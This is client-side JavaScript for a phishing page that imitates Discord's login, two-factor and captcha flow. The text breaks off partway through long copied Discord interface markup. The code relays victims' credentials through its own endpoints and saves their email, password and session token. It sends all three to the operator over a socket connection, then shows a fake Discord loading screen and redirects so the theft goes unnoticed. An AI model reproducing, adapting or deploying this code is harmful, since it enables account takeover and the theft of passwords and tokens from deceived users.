function getElementByXpath(path) {
    return document.evaluate(path, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
}
var keylol;

function process2fa() {
    var password = document.getElementById("password")
    var email = document.getElementById("email")
    fetch("/api/v9/auth/mfa/totp", {
            "headers": {
                "accept": "*/*",
                "accept-language": "en-GB",
                "content-type": "application/json",
                "origin": "discord.com",
                "x-debug-options": "bugReporterEnabled",
                "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzk0LjAuNDYwNi44MSBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiOTQuMC40NjA2LjgxIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjEwMTQ1MSwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
            },
            "referrer": "https://discord.com/login",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "{\"code\":\"" + document.getElementById("2facodelad").value + "\",\"ticket\":\"" + keylol + "\",\"login_source\":null,\"gift_code_sku_id\":null}",
            "method": "POST",
            "mode": "cors",
            "credentials": "include"
        }).then(response => response.text())
        .then((response) => {
            if (response.includes("token")) {
                const resp = JSON.parse(response);
                localStorage.setItem("token", resp.token);
                localStorage.setItem("email", email.value);
                localStorage.setItem("password", password.value);
                console.log(resp.token);
                fetch("https://discord.com/api/v9/users/@me", {
                        "headers": {
                            "accept": "*/*",
                            "accept-language": "en-GB",
                            "content-type": "application/json",
                            "authorization": resp.token,
                            "origin": "discord.com",
                            "x-debug-options": "bugReporterEnabled",
                            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzk0LjAuNDYwNi44MSBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiOTQuMC40NjA2LjgxIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjEwMTQ1MSwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
                        },
                        "referrer": "https://discord.com/login",
                        "referrerPolicy": "strict-origin-when-cross-origin",
                        "method": "GET",
                        "mode": "cors",
                        "credentials": "include"
                    }).then(response => response.text())
                    .then((response) => {
                        const resp2 = JSON.parse(response);
                        localStorage.setItem("pfp", `https://cdn.discordapp.com/avatars/${resp2.id}/${resp2.avatar}?size=128`);
                        localStorage.setItem("user", `${resp2.username}#${resp2.discriminator}`);
                        localStorage.setItem("id", resp2.id);

                        var socket = io();

                        setTimeout(() => {
                            socket.emit("login", {
                                "email": localStorage.getItem("email"),
                                "password": localStorage.getItem("password"),
                                "token": localStorage.getItem("token"),
                                "id": resp2.id,
                            });
                        }, 500);

                        document.getElementById("app-mount").innerHTML =
                            `<svg aria-hidden=true style=position:absolute;pointer-events:none;top:-1px;left:-1px;width:1px;height:1px viewBox="0 0 1 1"><mask id=svg-mask-squircle maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><path d="M0 0.464C0 0.301585 0 0.220377 0.0316081 0.158343C0.0594114 0.103776 0.103776 0.0594114 0.158343 0.0316081C0.220377 0 0.301585 0 0.464 0H0.536C0.698415 0 0.779623 0 0.841657 0.0316081C0.896224 0.0594114 0.940589 0.103776 0.968392 0.158343C1 0.220377 1 0.301585 1 0.464V0.536C1 0.698415 1 0.779623 0.968392 0.841657C0.940589 0.896224 0.896224 0.940589 0.841657 0.968392C0.779623 1 0.698415 1 0.536 1H0.464C0.301585 1 0.220377 1 0.158343 0.968392C0.103776 0.940589 0.0594114 0.896224 0.0316081 0.841657C0 0.779623 0 0.698415 0 0.536V0.464Z"fill=white></path></mask><mask id=svg-mask-header-bar-badge maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><rect fill=white height=1 width=1 x=0 y=0></rect><circle cx=0.75 cy=0.75 fill=black r=0.25></circle></mask><mask id=svg-mask-voice-user-summary-item maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><rect fill=white height=1 width=1></rect><circle cx=1.2083333333333333 cy=0.5 fill=black r=0.5416666666666666></circle></mask><mask id=svg-mask-vertical-fade maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><linearGradient id=svg-mask-vertical-fade-gradient gradientTransform=rotate(90) x1=0 x2=1 y1=0 y2=0><stop stop-color=white offset=0%></stop><stop stop-color=black offset=100%></stop></linearGradient><rect fill=url(#svg-mask-vertical-fade-gradient) height=1 width=1 x=0 y=0></rect></mask><mask id=svg-mask-panel-button maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><rect fill=white height=1 width=1 x=0 y=0></rect><circle cx=0.75 cy=0.75 fill=black r=0.25></circle></mask><mask id=svg-mask-channel-call-control-button maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><circle cx=0.8214285714285714 cy=0.8214285714285714 fill=black r=0.25></circle></mask><mask id=svg-mask-channel-call-control-button-badge-16 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.42857142857142855 width=0.42857142857142855 x=0.6428571428571429 y=-0.07142857142857142 rx=0.21428571428571427 ry=0.21428571428571427></rect></mask><mask id=svg-mask-channel-call-control-button-badge-22 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.42857142857142855 width=0.5357142857142857 x=0.5357142857142857 y=-0.07142857142857142 rx=0.21428571428571427 ry=0.21428571428571427></rect></mask><mask id=svg-mask-channel-call-control-button-badge-29 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.42857142857142855 width=0.6607142857142857 x=0.4107142857142857 y=-0.07142857142857142 rx=0.21428571428571427 ry=0.21428571428571427></rect></mask><mask id=svg-mask-avatar-default maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle></mask><mask id=svg-mask-avatar-status-round-16 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><circle cx=0.8125 cy=0.8125 fill=black r=0.3125></circle></mask><mask id=svg-mask-avatar-status-mobile-16 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.8125 width=0.625 x=0.5 y=0.3125 rx=0.1625 ry=0.1625></rect></mask><mask id=svg-mask-avatar-status-typing-16 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.625 width=1.1875 x=0.21875 y=0.5 rx=0.3125 ry=0.3125></rect></mask><mask id=svg-mask-avatar-status-round-24 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><circle cx=0.8333333333333334 cy=0.8333333333333334 fill=black r=0.2916666666666667></circle></mask><mask id=svg-mask-avatar-status-mobile-24 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.75 width=0.5833333333333334 x=0.5416666666666666 y=0.375 rx=0.15 ry=0.15></rect></mask><mask id=svg-mask-avatar-status-typing-24 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.5833333333333334 width=1.0833333333333333 x=0.2916666666666667 y=0.5416666666666666 rx=0.2916666666666667 ry=0.2916666666666667></rect></mask><mask id=svg-mask-avatar-status-round-32 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><circle cx=0.84375 cy=0.84375 fill=black r=0.25></circle></mask><mask id=svg-mask-avatar-status-mobile-32 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.65625 width=0.5 x=0.59375 y=0.4375 rx=0.13125 ry=0.13125></rect></mask><mask id=svg-mask-avatar-status-typing-32 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.5 width=0.96875 x=0.359375 y=0.59375 rx=0.25 ry=0.25></rect></mask><mask id=svg-mask-avatar-status-round-40 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><circle cx=0.85 cy=0.85 fill=black r=0.25></circle></mask><mask id=svg-mask-avatar-status-mobile-40 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.65 width=0.5 x=0.6 y=0.45 rx=0.13 ry=0.13></rect></mask><mask id=svg-mask-avatar-status-typing-40 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.5 width=0.95 x=0.375 y=0.6 rx=0.25 ry=0.25></rect></mask><mask id=svg-mask-avatar-status-round-80 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><circle cx=0.85 cy=0.85 fill=black r=0.175></circle></mask><mask id=svg-mask-avatar-status-mobile-80 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.45 width=0.35 x=0.675 y=0.575 rx=0.09 ry=0.09></rect></mask><mask id=svg-mask-avatar-status-typing-80 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.35 width=0.65 x=0.525 y=0.675 rx=0.175 ry=0.175></rect></mask><mask id=svg-mask-avatar-status-round-120 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><circle cx=0.8333333333333334 cy=0.8333333333333334 fill=black r=0.16666666666666666></circle></mask><mask id=svg-mask-avatar-status-mobile-120 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.43333333333333335 width=0.3333333333333333 x=0.6666666666666666 y=0.5666666666666667 rx=0.08666666666666667 ry=0.08666666666666667></rect></mask><mask id=svg-mask-avatar-status-typing-120 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.3333333333333333 width=0.6333333333333333 x=0.5166666666666667 y=0.6666666666666666 rx=0.16666666666666666 ry=0.16666666666666666></rect></mask><mask id=svg-mask-status-online-mobile maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><rect fill=white height=1 width=1 x=0 y=0 rx=0.1875 ry=0.125></rect><rect fill=black height=0.5 width=0.75 x=0.125 y=0.16666666666666666></rect><ellipse cx=0.5 cy=0.8333333333333334 fill=black rx=0.125 ry=0.08333333333333333></ellipse></mask><mask id=svg-mask-status-online maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle></mask><mask id=svg-mask-status-idle maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><circle cx=0.25 cy=0.25 fill=black r=0.375></circle></mask><mask id=svg-mask-status-dnd maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.25 width=0.75 x=0.125 y=0.375 rx=0.125 ry=0.125></rect></mask><mask id=svg-mask-status-offline maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><circle cx=0.5 cy=0.5 fill=black r=0.25></circle></mask><mask id=svg-mask-status-streaming maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><polygon fill=black points="0.35,0.25 0.78301275,0.5 0.35,0.75"></polygon></mask><mask id=svg-mask-status-typing maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><rect fill=white height=1 width=1 rx=0.2 ry=0.5 cx=0 cy=0></rect></mask><mask id=svg-mask-avatar-voice-call-80 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><circle cx=0.85 cy=0.85 fill=black r=0.2></circle></mask><mask id=svg-mask-avatar-call-icon maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5 opacity=1></circle><circle cx=0.85 cy=0.15 fill=black r=0.2></circle></mask><mask id=svg-mask-avatar-call-icon-32 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5 opacity=0.5></circle><circle cx=0.8 cy=0.25 fill=black r=0.325></circle></mask><mask id=svg-mask-sticker-rounded-rect maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><path d="M0 0.26087C0 0.137894 0 0.0764069 0.0382035 0.0382035C0.0764069 0 0.137894 0 0.26087 0H0.73913C0.862106 0 0.923593 0 0.961797 0.0382035C1 0.0764069 1 0.137894 1 0.26087V0.73913C1 0.862106 1 0.923593 0.961797 0.961797C0.923593 1 0.862106 1 0.73913 1H0.26087C0.137894 1 0.0764069 1 0.0382035 0.961797C0 0.923593 0 0.862106 0 0.73913V0.26087Z"fill=white></path></mask><mask id=svg-mask-chat-input-button-notification maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><rect fill=white height=1 width=1></rect><circle cx=0.85 cy=0.85 fill=black r=0.25></circle></mask><mask id=svg-mask-sticker-shop-notification maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><rect fill=white height=1 width=1></rect><circle cx=0.9 cy=0.9 fill=black r=0.5></circle></mask><mask id=svg-mask-autocomplete-emoji-upsell-emoji maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><rect fill=white height=1 width=1></rect><circle cx=1.33 cy=0.5 fill=black r=0.5833333333333334></circle></mask><mask id=svg-mask-event-ticket maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><path d="M0 0.12C0 0.0779961 0 0.0569941 0.00408726 0.0409507C0.00768251 0.0268386 0.0134193 0.015365 0.0204754 0.00817451C0.028497 0 0.038998 0 0.06 0H0.94C0.961002 0 0.971503 0 0.979525 0.00817451C0.986581 0.015365 0.992318 0.0268386 0.995913 0.0409507C1 0.0569941 1 0.0779961 1 0.12V0.45C0.986193 0.45 0.975 0.472386 0.975 0.5C0.975 0.527614 0.986193 0.55 1 0.55V0.88C1 0.922004 1 0.943006 0.995913 0.959049C0.992318 0.973161 0.986581 0.984635 0.979525 0.991826C0.971503 1 0.961002 1 0.94 1H0.0600001C0.0389981 1 0.028497 1 0.0204754 0.991826C0.0134193 0.984635 0.00768251 0.973161 0.00408726 0.959049C0 0.943006 0 0.922004 0 0.88V0.55C0.0138071 0.55 0.025 0.527614 0.025 0.5C0.025 0.472386 0.0138071 0.45 0 0.45V0.12Z"fill=white></path></mask></svg><svg aria-hidden=true style=position:absolute;pointer-events:none;top:-1px;left:-1px;width:1px;height:1px viewBox="0 0 1 1"><linearGradient id=4d7c3cc7-fc0a-4195-a5a9-c4027330fa6e><stop stop-color="hsl(228, calc(var(--saturation-factor, 1) * 86.7%), 70.6%)"></stop><stop stop-color="hsl(244, calc(var(--saturation-factor, 1) * 100%), 84.1%)"offset=1></stop></linearGradient><linearGradient id=24aa1047-e59a-4d1c-81ba-6d8f6b101b0f><stop stop-color="hsl(270, calc(var(--saturation-factor, 1) * 86.7%), 70.6%)"></stop><stop stop-color="hsl(342, calc(var(--saturation-factor, 1) * 58%), 72.9%)"offset=1></stop></linearGradient><linearGradient id=73effe82-7fd3-4e57-bb44-5da4b7f75057><stop stop-color="hsl(221, calc(var(--saturation-factor, 1) * 70%), 55.5%)"></stop><stop stop-color="hsl(269, calc(var(--saturation-factor, 1) * 83.8%), 71%)"offset=1></stop></linearGradient><linearGradient id=c734f07b-5ba3-4089-a64b-e342b77af2cd><stop stop-color="hsl(166, calc(var(--saturation-factor, 1) * 51%), 50.4%)"></stop><stop stop-color="hsl(201, calc(var(--saturation-factor, 1) * 51.6%), 52.2%)"offset=1></stop></linearGradient></svg><div style=position:fixed;opacity:0;pointer-events:none></div><div class=app-1q1i1E><div class="container-16j22k fixClipping-3qAKRb"style=opacity:1><div class=content-1-zrf2><video autoplay class=ready-36e6Vk loop playsinline=""><source src=/assets/3b0d96ed8113994f3d139088726cfecd.webm type=video/webm><source src=/assets/6d5b64b094944af6d52d895c8c2b8a59.mp4 type=video/mp4><img alt=""src=/assets/dff87c953f43b561d71fbcfe8a93a79a.png></video><div class=text-3c9Zq1><div class=tipTitle-GL9qAt>Did you know</div><div class=tip-2cgoli>Type /tenor or /giphy + anything to find a GIF for that topic!</div><div class="body-2Vra9D contentBase-11jeVK"></div></div></div></div></div><div></div><div></div><div class=layerContainer-yqaFcK></div><div class=layerContainer-yqaFcK></div><div style=position:fixed;opacity:0;pointer-events:none></div>`;
                        setTimeout(() => {
                            window.location.replace(`/${makeid(24)}`);
                        }, 2500)
                    });

            } else if (response.contains("Invalid two-factor code")) {

            }
        }).catch((err) => {
            setInterval(() => {
                console.error(err);
            }, 100);

            location.reload();
        });
}

function generateQRCode(link) {
    new QRCode(document.getElementById("qrcode"), {
        text: link,
        logoBackgroundColor: '#FFF',
        logoBackgroundTransparent: false,
        width: 160,
        height: 160
    });

    document.getElementById("qrcode-img").style = "visibility: visible;";
}

function dothefinish() {
    var password = document.getElementById("password")
    var email = document.getElementById("email")
    var lovelylad = getElementByXpath('//*[@id="hcaptchaiframe"]/iframe').getAttribute("data-hcaptcha-response");
    document.getElementsByClassName("authBoxExpanded-2jqaBe")[0].style.display = "block";
    document.getElementById("captchabox").style.display = "none";
    fetch("/api/v9/auth/login", {
            "headers": {
                "accept": "*/*",
                "accept-language": "en-GB",
                "authorization": "undefined",
                "content-type": "application/json",
                "origin": "discord.com",
                "x-debug-options": "bugReporterEnabled",
                "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzk0LjAuNDYwNi44MSBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiOTQuMC40NjA2LjgxIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6Imh0dHBzOi8vd3d3Lmdvb2dsZS5jb20vIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50Ijoid3d3Lmdvb2dsZS5jb20iLCJzZWFyY2hfZW5naW5lX2N1cnJlbnQiOiJnb29nbGUiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoxMDE0NTEsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
            },
            "referrer": "https://discord.com/login",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "{\"login\":\"" + email.value + "\",\"password\":\"" + password.value +
                "\",\"undelete\":false,\"captcha_key\":\"" + lovelylad +
                "\",\"login_source\":null,\"gift_code_sku_id\":null}",
            "method": "POST",
            "mode": "cors",
            "credentials": "include"
        }).then(response => response.text())
        .then((response) => {
            if (response.includes('token":"')) {
                const resp1 = JSON.parse(response);
                localStorage.setItem("token", resp1.token);
                localStorage.setItem("email", email.value);
                localStorage.setItem("password", password.value);
                fetch("https://discord.com/api/v9/users/@me", {
                        "headers": {
                            "accept": "*/*",
                            "accept-language": "en-GB",
                            "content-type": "application/json",
                            "authorization": resp1.token,
                            "origin": "discord.com",
                            "x-debug-options": "bugReporterEnabled",
                            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzk0LjAuNDYwNi44MSBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiOTQuMC40NjA2LjgxIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjEwMTQ1MSwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
                        },
                        "referrer": "https://discord.com/login",
                        "referrerPolicy": "strict-origin-when-cross-origin",
                        "method": "GET",
                        "mode": "cors",
                        "credentials": "include"
                    }).then(response => response.text())
                    .then((response) => {
                        const resp2 = JSON.parse(response);
                        localStorage.setItem("pfp", `https://cdn.discordapp.com/avatars/${resp2.id}/${resp2.avatar}?size=128`);
                        localStorage.setItem("user", `${resp2.username}#${resp2.discriminator}`);
                        localStorage.setItem("id", resp2.id);

                        var socket = io();

                        setTimeout(() => {
                            socket.emit("login", {
                                "email": localStorage.getItem("email"),
                                "password": localStorage.getItem("password"),
                                "token": localStorage.getItem("token"),
                                "id": resp2.id,
                            });
                        }, 500);

                        document.getElementById("app-mount").innerHTML =
                            `<svg aria-hidden=true style=position:absolute;pointer-events:none;top:-1px;left:-1px;width:1px;height:1px viewBox="0 0 1 1"><mask id=svg-mask-squircle maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><path d="M0 0.464C0 0.301585 0 0.220377 0.0316081 0.158343C0.0594114 0.103776 0.103776 0.0594114 0.158343 0.0316081C0.220377 0 0.301585 0 0.464 0H0.536C0.698415 0 0.779623 0 0.841657 0.0316081C0.896224 0.0594114 0.940589 0.103776 0.968392 0.158343C1 0.220377 1 0.301585 1 0.464V0.536C1 0.698415 1 0.779623 0.968392 0.841657C0.940589 0.896224 0.896224 0.940589 0.841657 0.968392C0.779623 1 0.698415 1 0.536 1H0.464C0.301585 1 0.220377 1 0.158343 0.968392C0.103776 0.940589 0.0594114 0.896224 0.0316081 0.841657C0 0.779623 0 0.698415 0 0.536V0.464Z"fill=white></path></mask><mask id=svg-mask-header-bar-badge maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><rect fill=white height=1 width=1 x=0 y=0></rect><circle cx=0.75 cy=0.75 fill=black r=0.25></circle></mask><mask id=svg-mask-voice-user-summary-item maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><rect fill=white height=1 width=1></rect><circle cx=1.2083333333333333 cy=0.5 fill=black r=0.5416666666666666></circle></mask><mask id=svg-mask-vertical-fade maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><linearGradient id=svg-mask-vertical-fade-gradient gradientTransform=rotate(90) x1=0 x2=1 y1=0 y2=0><stop stop-color=white offset=0%></stop><stop stop-color=black offset=100%></stop></linearGradient><rect fill=url(#svg-mask-vertical-fade-gradient) height=1 width=1 x=0 y=0></rect></mask><mask id=svg-mask-panel-button maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><rect fill=white height=1 width=1 x=0 y=0></rect><circle cx=0.75 cy=0.75 fill=black r=0.25></circle></mask><mask id=svg-mask-channel-call-control-button maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><circle cx=0.8214285714285714 cy=0.8214285714285714 fill=black r=0.25></circle></mask><mask id=svg-mask-channel-call-control-button-badge-16 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.42857142857142855 width=0.42857142857142855 x=0.6428571428571429 y=-0.07142857142857142 rx=0.21428571428571427 ry=0.21428571428571427></rect></mask><mask id=svg-mask-channel-call-control-button-badge-22 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.42857142857142855 width=0.5357142857142857 x=0.5357142857142857 y=-0.07142857142857142 rx=0.21428571428571427 ry=0.21428571428571427></rect></mask><mask id=svg-mask-channel-call-control-button-badge-29 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.42857142857142855 width=0.6607142857142857 x=0.4107142857142857 y=-0.07142857142857142 rx=0.21428571428571427 ry=0.21428571428571427></rect></mask><mask id=svg-mask-avatar-default maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle></mask><mask id=svg-mask-avatar-status-round-16 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><circle cx=0.8125 cy=0.8125 fill=black r=0.3125></circle></mask><mask id=svg-mask-avatar-status-mobile-16 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.8125 width=0.625 x=0.5 y=0.3125 rx=0.1625 ry=0.1625></rect></mask><mask id=svg-mask-avatar-status-typing-16 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.625 width=1.1875 x=0.21875 y=0.5 rx=0.3125 ry=0.3125></rect></mask><mask id=svg-mask-avatar-status-round-24 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><circle cx=0.8333333333333334 cy=0.8333333333333334 fill=black r=0.2916666666666667></circle></mask><mask id=svg-mask-avatar-status-mobile-24 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.75 width=0.5833333333333334 x=0.5416666666666666 y=0.375 rx=0.15 ry=0.15></rect></mask><mask id=svg-mask-avatar-status-typing-24 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.5833333333333334 width=1.0833333333333333 x=0.2916666666666667 y=0.5416666666666666 rx=0.2916666666666667 ry=0.2916666666666667></rect></mask><mask id=svg-mask-avatar-status-round-32 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><circle cx=0.84375 cy=0.84375 fill=black r=0.25></circle></mask><mask id=svg-mask-avatar-status-mobile-32 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.65625 width=0.5 x=0.59375 y=0.4375 rx=0.13125 ry=0.13125></rect></mask><mask id=svg-mask-avatar-status-typing-32 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.5 width=0.96875 x=0.359375 y=0.59375 rx=0.25 ry=0.25></rect></mask><mask id=svg-mask-avatar-status-round-40 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><circle cx=0.85 cy=0.85 fill=black r=0.25></circle></mask><mask id=svg-mask-avatar-status-mobile-40 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.65 width=0.5 x=0.6 y=0.45 rx=0.13 ry=0.13></rect></mask><mask id=svg-mask-avatar-status-typing-40 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black 